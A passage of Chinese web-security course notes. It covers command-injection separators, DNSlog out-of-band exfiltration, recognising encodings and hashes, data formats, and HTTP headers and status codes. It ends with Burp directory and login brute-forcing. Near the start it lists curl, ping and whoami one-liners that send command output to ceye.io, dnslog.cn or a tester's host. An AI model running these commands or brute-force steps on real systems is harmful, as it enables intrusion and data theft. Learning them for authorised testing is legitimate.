alt="image-20250420173346329"></p><p>使用数据访问外部DNSLOG的方式外带</p><p>常用dnslog：</p><ul><li><a href="http://ceye.io/">http://ceye.io</a></li><li><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></li><li><a href="http://eyes.sh/dns/">http://eyes.sh/dns/</a></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">管道符：| (管道符号) ||（逻辑或） &amp;&amp;（逻辑与） &amp;(后台任务符号)</span><br><span class="line"><span class="meta prompt_">Windows-&gt;</span><span class="language-bash">| &amp; || &amp;&amp;</span></span><br><span class="line"><span class="meta prompt_">Linux-&gt;</span><span class="language-bash">; | || &amp; &amp;&amp; ``(特有``和;)</span></span><br></pre></td></tr></table></figure><p>Linux常用外带方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl http://haha.xxx.ceye.io/`whoami`</span><br><span class="line"></span><br><span class="line">ping `whoami`.xxxx.ceye.io</span><br><span class="line"></span><br><span class="line">ping $(whoami).dyy8n3.dnslog.cn</span><br><span class="line"></span><br><span class="line">whois -h 192.168.233.128 -p 8888 `whoami`</span><br></pre></td></tr></table></figure><p>Windows外带方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.GoldY.eyes.sh</span><br><span class="line"></span><br><span class="line">for /F &quot;delims=\&quot; %i in (&#x27;whoami&#x27;) do ping %i.91pjgw.dnslog.cn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要vpc开启一个http服务</span></span><br><span class="line">for /F &quot;delims=&quot; %i in (&#x27;whoami&#x27;) do curl http://192.168.43.190:8000/%i</span><br></pre></td></tr></table></figure><h1 id="编码与加解密"><a href="#编码与加解密" class="headerlink" title="编码与加解密"></a>编码与加解密</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p><a href="https://www.inkomet.com/detail.php?id=MQ==">https://www.inkomet.com/detail.php?id=MQ==</a></p><p>进行测试的的语句：</p><p><a href="https://www.inkomet.com/detail.php?id=2">https://www.inkomet.com/detail.php?id=2</a> ——–&gt;  没有正确的回显</p><p><a href="https://www.inkomet.com/detail.php?id=Mg==">https://www.inkomet.com/detail.php?id=Mg==</a> ———&gt; 正确回显</p><p>数据在传输的时候进行编码 为什么要了解?</p><p>服务器在接受参数的可能会进行解码再带入，如果payload没有进行同样的编码，出入后端的数据就无法进行有效的测试</p><p>正确:测试的话也要进行pay1oad同样的加密或编码进行提交</p><p>安全测试漏洞时候 通常都会进行数据的修改增加提交测试</p><p>场景：登录的数据包</p><p>admin 123456</p><p>username&#x3D;admin&amp;password&#x3D;e10adc3949ba59abbe56e057f20f883e<br>如果现在我要进行密码的破解爆破</p><p>字典文件:<br>    帐号什么都不用更改 去替换username&#x3D;值即可</p><p>​密码需要进行密码算法 保证和password&#x3D;值同等加密才行</p><h2 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h2><h3 id="针对对象"><a href="#针对对象" class="headerlink" title="针对对象"></a>针对对象</h3><h4 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h4><p><strong>传输数据：</strong></p><p>​加密：md5</p><p>​编码：base64</p><p>通常根据数据加密或编码的数据，进行相应payload加密或编码后，进行漏洞探测发现（漏洞探针）</p><p><strong>数据格式：</strong></p><ul><li>常规方式</li><li>JSON</li><li>XML</li></ul><p>在数据包使用不同数据格式时候，需要对payload进行相应的数据格式转换（发送漏洞探针，回显数据分析）</p><p><strong>产品</strong></p><p>不同的web网站可能采用的数据方式并不一致：如CMS Discuz不同版本采用不同的加密方式（MD5+salt、使用password_hash()函数进行加密）</p><p>密文存储加密方式：</p><ul><li>MD5</li><li>MD5+SALT</li><li>AES</li><li>DES</li></ul><h4 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h4><p>只要针对后测试</p><p>1、Windows</p><p>在Win10之前（包括win10）使用的用户密码加密方式为NTML</p><p>2、Linux</p><p>使用的是md5+salt方式进行存储用户密码</p><p>一般情况难以进行破解</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ul><li>java</li><li>.net</li><li>安卓</li><li>ios</li></ul><p>有时为了保护源代码可能会对代码进行二次加密</p><p><a href="https://www.phpencode.cn/free_sg">千古互动 免费PHP加密 - SG11,SG13,SG14,SG15,Phpencode.cn,SG11加密平台,PHP加密平台,免费PHP加密,PHP在线加密</a></p><p><a href="https://yours.tools/zh/enphp.html">php在线混淆加密,支持php5和php7代码在线加密混淆-在线工具网</a></p><p><img src="/img/xiaodi/1745501662219.png" alt="1745501662219"></p><h3 id="逆向思路"><a href="#逆向思路" class="headerlink" title="逆向思路"></a>逆向思路</h3><p>1、看密文的特征分析算法</p><p>2、获取源码分析算法（后端加密）</p><p>3、JS前端进行加密（前端加密）</p><h3 id="识别并解密"><a href="#识别并解密" class="headerlink" title="识别并解密"></a>识别并解密</h3><blockquote><ol><li><p>单向散列加密 -MD5<br>单向散列加密算法的优点有(以MD5为例)：<br>方便存储，损耗低：加密&#x2F;加密对于性能的损耗微乎其微。<br>单向散列加密的缺点就是存在暴力破解的可能性，最好通过加盐值的方式提高安全性，此外可能存在散列冲突。我们都知道MD5加密也是可以破解的。<br>常见的单向散列加密算法有：<br>MD5 SHA MAC CRC</p></li><li><p>对称加密 -AES<br>对称加密优点是算法公开、计算量小、加密速度快、加密效率高。<br>缺点是发送方和接收方必须商定好密钥，然后使双方都能保存好密钥，密钥管理成为双方的负担。<br>常见的对称加密算法有：<br>DES AES RC4</p></li><li><p>非对称加密 -RSA<br>非对称加密的优点是与对称加密相比，安全性更好，加解密需要不同的密钥，公钥和私钥都可进行相互的加解密。<br>缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。<br>常见的非对称加密算法：<br>RSA RSA2 PKCS</p></li></ol></blockquote><p>MD5密文特点：<br>1、由数字“0-9”和字母“a-f”所组成的字符串<br>2、固定的位数 16 和 32位<br>解密需求：密文即可，但复杂明文可能解不出</p><p>BASE64编码特点：<br>0、大小写区分，通过数字和字母的组合<br>1、一般情况下密文尾部都会有两个等号，明文很少的时候则没有<br>2、明文越长密文越长，一般不会出现”&#x2F;“”+”在密文中</p><p>AES、DES密文特点：<br>同BASE64基本类似，但一般会出现”&#x2F;“和”+”在密文中<br>解密需求：密文，模式，加密Key，偏移量，条件满足才可解出</p><p>RSA密文特点：<br>特征同AES,DES相似，但是长度较长<br>解密需求：密文，公钥或私钥即可解出</p><p>​</p><h1 id="数据传输格式"><a href="#数据传输格式" class="headerlink" title="数据传输格式"></a>数据传输格式</h1><p><strong>在进行安全测试时，通过使用抓包工具进行抓包，必须按照目标系统的数据格式发送数据，否则会导致测试无效。</strong></p><h2 id="常规格式"><a href="#常规格式" class="headerlink" title="常规格式"></a>常规格式</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure><p>最常使用的数据包传输格式，使用&amp;符号进行连接不同的参数值</p><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;课程&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;items&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;itemId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;itemName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;数学&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;itemId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;itemName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;化学&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JSON是一种轻量级的数据交换格式，易于阅读和编写，广泛应用于Web应用程序中。它的优点包括易于解析和生成，支持多种编程语言，数据结构简单且可嵌套。然而，JSON的数据体积相对较大。</p><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;students&gt;</span><br><span class="line">&lt;student id=&quot;001&quot;&gt;</span><br><span class="line">&lt;name&gt;微信1&lt;/name&gt;</span><br><span class="line">&lt;学号&gt;20140101&lt;/学号&gt;</span><br><span class="line">&lt;地址&gt;广州&lt;/地址&gt;</span><br><span class="line">&lt;座右铭&gt;要么强大，要么听话&lt;/座右铭&gt;</span><br><span class="line">&lt;/student&gt;</span><br><span class="line">&lt;student id=&quot;002&quot;&gt;</span><br><span class="line">&lt;name&gt;微博1&lt;/name&gt;</span><br><span class="line">&lt;学号&gt;20140102&lt;/学号&gt;</span><br><span class="line">&lt;地址&gt;广州&lt;/地址&gt;</span><br><span class="line">&lt;座右铭&gt;在哭泣中学会坚强&lt;/座右铭&gt;</span><br><span class="line">&lt;/student&gt;</span><br><span class="line">&lt;/students&gt;</span><br></pre></td></tr></table></figure><p>XML是一种可扩展的标记语言，用于描述和传输结构化数据，常用于Web服务和配置文件中。它具有自我描述性和可扩展性，适用于复杂数据结构和文档的交换。然而，XML标签冗余，数据体积较大，解析和生成相对复杂。</p><h1 id="HTTP数据包"><a href="#HTTP数据包" class="headerlink" title="HTTP数据包"></a>HTTP数据包</h1><h2 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h2><p>利用HTTP访问网站都有哪些请求方法，请求方法对应特点？<br>GET: 直接获取网站资源<br>POST：客户端有信息要提交到服务端时（登录 搜索）<br>HEAD:类似GET方法，不会返回响应主体信息<br>PUT：用来将本地资源上传到服务端<br>OPTIONS:用来检测服务端可以接收哪些访问请求（安全）<br>TRACE:可以在响应报文中，看到请求报文的内容</p><h2 id="HTTP请求报文信息"><a href="#HTTP请求报文信息" class="headerlink" title="HTTP请求报文信息"></a>HTTP请求报文信息</h2><img src="/img/xiaodi/image-20250506205343605.png" alt="image-20250506205343605" style="zoom:50%;" /><p><strong>第一部分：请求行信息</strong><br>1）请求方法信息：GET POST PUT HEAD …<br>2）请求资源信息：<br>   host（访问网站域名&#x2F;地址&#x2F;端口）+请求资源<br>   host: 确认访问站点目录<br>   请求资源：三种情况<br>   1 正常请求资源- oldboy.jpg<br>   2 默认请求-&#x2F; &#x2F;admin&#x2F; 请求首页文件-index.html index.php index.jsp<br>   3 访问代码资源需要传入参数</p><p>   协议（HTTP&#x2F;HTTPS&#x2F;FTP）+host（访问网站域名&#x2F;地址&#x2F;端口）+请求资源  – 请求信息 &#x3D;&#x3D; URL</p><p>   URL(Uniform Resource Locator，统一资源定位符),是标识Web资源的唯一标识符.通过它即可获取其标识的资源。</p><p>3）请求HTTP版本信息（1.1 2.0）<br>1.0 属于TCP短连接访问  一次连接对应一次请求<br>1.1 属于TCP长连接访问  一次连接对应多次请求<br>2.0 可以实现并发请求处理    适合电商网站</p><p><strong>第二部分：请求头信息</strong><br>请求过程各种字段信息：<br>Accept: 确认客户端请求资源类型信息<br>Referer：消息头用于表示发出请求的原始URL；告知服务端是从哪访问过来的（*****）<br>            有referer：可以获得跳转源url地址信息（记录推广次数）<br>            无referer：代表直接访问网站资源</p><pre><code>        视频网站：视频无法下载 会员登录 http://www.aiqiyi.com/vip/xxx  -- vip电影                                          http://www.aiqiyi.com/            vip电影6分钟                                                 修改请求信息：添加referer：http://www.aiqiyi.com/vip/xxx  </code></pre><p>Accept-Language：请求返回语言字符信息<br>User-Agent：消息头提供与浏览器或其他生成请求的客户端软件有关的信息；获取客户端指纹信息&#x2F;客户端访问浏览器信息（<em><strong><strong>）<br>Accept-Encoding：浏览器支持的压缩编码是 gzip 和 deflate<br>Cookie：消息头用于提交服务器向客户端发布的其他参数（</strong></strong></em>）<br>        HTTP属于无状态访问方式，不会记录访问者的身份信息，都需要输入用户名和密码<br>        利用cooke记住用户访问情况：避免反复登录网站</p><pre><code>    cookie类型：    会话cookie：临时产生或短期应用    长期cookie：一般互联网网站        cookie属性：    secure：如果设置这个属性.则仅在HTTPS请求中提交cookie.  （*****）    Httponly：如果设置这个属性，将无法通过客户端JavaScript直接访问cookie.                                服务 识别用户访问行为                  抖音网站 -- cookie 123                cookie 123 视频--美女   记录123 美女                 cookie 123 视频--美女   记录123 美女                cookie 123 视频--美女   记录123 美女                  推广 美女居多  体育  jd 苹果电脑 -- 苹果</code></pre><p>Connection：     表示持久的客户端与服务连接；定义客户端与服务建立TCP连接方式（短连接&#x2F;长连接）<br>X_FORWARDED_FOR：可以获取真实客户端IP地址信息；可以伪装自己客户端地址；<br>                 请求头里面添加X_FORWARDED_FOR<br>                 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</p><p>空行<br><strong>第三个部分：请求主体信息</strong><br>一般是利用post方法进行请求时，会含有请求主体信息（默认HTTP访问会已明文信息显示）</p><h2 id="HTTP响应报文信息"><a href="#HTTP响应报文信息" class="headerlink" title="HTTP响应报文信息"></a><strong>HTTP响应报文信息</strong></h2><p>第一个部分：响应行（起始行）信息<br>1）HTTP&#x2F;1.1 响应的HTTP协议版本信息<br>2）200 状态码：返回请求结果<br>   常用状态码分类：<br>   1xx：提供信息（需要客户端提供信息）<br>   2xx：请求被成功提交，并能够正确处理请求<br>   3xx：客户端被重定向到其他资源（重要部分）<br>   4xx：请求包含某种错误（客户端请求异常） – 显示错误页面<br>   5xx：服务器执行请求时遇到错误（服务端响应异常） – 检查服务端配置</p><p>   常用状态有什么：面试问到<br>   100 Continue：表示服务端收到了客户端的请求信息（POST），但是没有收到请求主体信息<br>   200 OK:本状态码表示已成功提交请求，且响应主体中包含请求结果。<br>   201 Created:客户端进行PUT请求时，有数据文件上传到服务端成功后，会响应201状态码信息<br>   301 Moved Permanently：本状态码将浏览器永久重定向到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。<br>   302 Found本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL.<br>    PS：网站页面跳转，可以对协议 对域名 对资源信息做跳转处理，以便用户在访问旧的资源信息时，可以获取到新的资源信息<br>   304 Not Modified。       本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与工If-None-Match消息头确定客户端是否拥有最新版本的资源。</p><p>   401 Unauthorized.服务器在许可请求前要求HTTP进行身份验证。WWW-Authenticate消息头详细说明所支持的身份验证类型。<br>                            参考链接：<a href="https://blog.csdn.net/chj_1224365967/article/details/113946038">https://blog.csdn.net/chj_1224365967/article/details/113946038</a><br>                            第一步：编写配置文件<br>                            第二步：创建用户密码文件<br>                            第三步：重启nginx<br> 403 Forbidden本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资源。<br>                            参考链接：<a href="https://blog.csdn.net/yxhxj2006/article/details/121623574">https://blog.csdn.net/yxhxj2006/article/details/121623574</a><br>                            访问首页文件不存在，也会出现此状态码<br> 404 Not Found。本状态码表示所请求的资源并不存在。<br> 405 Method Not Allowed本状态码表示指定的URL不支持请求中使用的方法。例如，如果试图在不支持PUT方法的地方使用该方法，就会收到本状态码。<br>                            服务端做了请求方法限制</p><p>   500 Internal Server Error本状态码表示服务器在执行请求时遇到错误。当提交无法预料的输人、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。<br>                                应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。<br>                                PS：检查访问网站代码逻辑（代码审计）<br> 503 Service Unavailable。通常，本状态码表示尽管Web服务器运转正常.并且能够响应请求，但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了某种行为而造成这个结果。<br>   502                          PS：需要访问后端数据库服务，但是后端数据库服务没有响应</p><p><strong>第二个部分：响应头信息</strong><br><img src="/img/xiaodi/image-20250506205521065.png" alt="image-20250506205521065"></p><p><strong>第三个部分：响应主体信息</strong><br>响应HTML代码信息，浏览器识别HTML代码加载页面</p><h2 id="跨平台测试注意事项"><a href="#跨平台测试注意事项" class="headerlink" title="跨平台测试注意事项"></a>跨平台测试注意事项</h2><p>在不同终端测试时，必须保证数据包结构与目标平台完全一致</p><p>eg.不同的设备访问同一web界面返回不一致</p><ul><li><p>移动设备和PC访问同一接口可能返回不同数据</p></li><li><p>识别依据：User-Agent字段是主要设备标识</p></li><li><p>解决方法修改请求头模拟移动设备访问</p><ul><li>需要完整复制移动端的请求头参数</li><li>特别是Android版本和设备型号信息</li><li>缺少移动端特有参数会导致403错误</li></ul></li></ul><p><strong>根据状态码判断是否存在该文件或路径</strong></p><ul><li>文件存在判断：返回200表示文件存在且可访问；返回404表示文件不存在。</li><li>文件夹存在判断：返回403表示文件夹存在但无索引文件；若文件夹下有默认索引文件（如index.php），则返回200。</li><li>重定向判断：30X状态码可能表示文件存在触发跳转，也可能是不存在时的容错跳转，需结合具体情况分析。</li></ul><p><strong>burp进行目录爆破方法</strong></p><ul><li><p>操作流程</p><ul><li>抓取目标网站请求包</li><li>在路径末尾添加变量标记（如§）</li><li>载入路径字典文件（包含_system、user等常见路径）</li><li>设置5个并发线程进行扫描</li></ul></li><li><p>结果分析：通过对比状态码（200&#x2F;403&#x2F;404）识别有效路径，如index.php返回200表示存在</p></li></ul><p> <strong>登录爆破技术</strong></p><ul><li><p>双重验证机制：发现系统同时验证明文密码和MD5加密密码，两者需同时正确才能登录</p></li><li><p>爆破技巧</p><ul><li>使用Burp的Payload Processing功能自动生成MD5值</li><li>通过状态码差异判断（302跳转为成功，500为失败）</li><li>实际测试发现只需加密密码正确即可绕过验证</li></ul></li><li><p>实战验证：通过修改数据包中的password_md5字段为已知MD5值成功登录</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
